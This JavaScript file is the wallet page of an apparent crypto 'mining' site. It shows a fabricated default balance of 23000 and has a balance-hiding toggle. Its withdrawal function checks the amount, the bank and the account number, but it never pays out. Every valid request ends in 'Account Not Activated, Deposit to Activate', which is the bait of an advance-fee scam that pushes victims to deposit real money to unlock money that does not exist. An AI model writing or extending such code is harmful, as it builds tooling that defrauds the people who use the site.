// --- HIDE / HOW - NEW, your old vars not touched ---
let isHidden = false;
let savedBalance = "";

function toggleShowBal(){
  const w = document.getElementById("wallet");
  const eye = document.getElementById("ppp");

  if(isHidden === false){
    savedBalance = w.innerText;
    w.innerText = "****.**";
    eye.innerText = "🙈";
    isHidden = true;
  } else {
    w.innerText = savedBalance;
    eye.innerText = "👁️";
    isHidden = false;
  }
}

// Assume 'currentBalance' is your updated number vari
// NOW CHECKS BOTH 'fresh' AND 'hiace_balance' FROM MINING PAGE
let activeBalance = parseFloat(localStorage.getItem('hiace_balance')) || 23000;

updateDisplay();

//withdraw function on wallet
function cont(){
  const mess = document.getElementById("mess");
  
  mess.style.color="red";
  const amount = document.getElementById("amountInput");
  const input = parseFloat(amount.value);

  const account = document.querySelector("textarea").value;
  const bank = document.getElementById("chooses");
  const mumber = document.getElementById("Number").value;
  
  //condition to withdrawal
  if (input <= 0 || isNaN(input)){
    alert("Please put in a valid amount");
    mess.innerHTML="Please put in a valid amount";
    mess.style.color= "red";
    return;
  }
  if ( (!account) || (!bank.value) || (!mumber)) {
    alert("please fill in a valid detail");
    mess.innerHTML= "please fill in a valid detail";
    mess.style.color="red";
    return;
  }
                
  if(input > activeBalance){
    mess.innerHTML="Insufficient Funds";
    mess.style.color="red";
    return;
  }

  if (mumber.length < 10){
    alert("Invalid Account number");
    mess.innerHTML="Invalid Account number";
    mess.style.color="red";
    return;
  }
  else{
    
    mess.innerHTML="Account Not Activated, Deposit to Activate";
    
    // also save to mining key so mining page sees new balance
    localStorage.setItem('hiace_balance', activeBalance.toFixed(2));
    updateDisplay();
  } 
  amount.value="";
}

function updateDisplay(){
  const walletEl = document.getElementById("wallet");
  if(walletEl){
    walletEl.innerText = activeBalance.toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2});
    savedBalance = walletEl.innerText;
  }
}